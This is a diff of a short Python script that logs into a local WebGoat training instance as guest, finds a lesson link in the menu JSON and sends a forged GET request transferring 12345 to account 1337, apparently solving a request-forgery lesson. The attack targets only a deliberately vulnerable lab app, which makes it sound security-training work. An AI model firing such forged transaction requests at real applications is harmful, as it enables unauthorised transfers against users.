@@ -1,25 +1,27 @@
 import requests
+import json
 
-#makes a call to the page
-r = requests.get('http://127.0.0.1:8080/WebGoat/')
-dict =  r.headers
-cookie = dict['Set-Cookie']
-print cookie
-sessionID = cookie[11:43]
-print sessionID
-print r.cookies
+s = requests.Session()
+r = s.get('http://127.0.0.1:8080/WebGoat/login.mvc')
+session1 = r.headers['Set-Cookie']
+print session1
 
-the_url = "http://127.0.0.1:8080/WebGoat/j_spring_security_check/jsessionid=" + sessionID
-print the_url
+r = s.post('http://127.0.0.1:8080/WebGoat/j_spring_security_check;jsessionid=' + session1, data={"username":"guest","password":"guest"})
+session2 =  r.request.headers['Cookie']
+print session2
 
-#log into WebGoat
-r = requests.post(the_url, data = {"username":"guest", "password":"guest"})
-print r.headers
+r = s.get('http://127.0.0.1:8080/WebGoat/attack?Screen=146&menu=400')
+r = s.get('http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc')
 
-#Click on menu item and complete transactions
-r = requests.get("http://127.0.0.1:8080/WebGoat/attack?Screen=146&menu=400&from=ajax&newAccount=1337&amount=12345&confirm=Confirm")
+my_dict = r.json()
 
-try:
-	print r
-except Exception as e:
-	print e
+my_link =  my_dict[3]['children'][6]['link']
+print my_link
+
+attack_url = 'http://127.0.0.1:8080/WebGoat/' + my_link + '&from=ajax&newAccount=1337&amount=12345&confirm=Confirm'
+print attack_url
+
+r = s.get(attack_url)
+print r.text
+
+
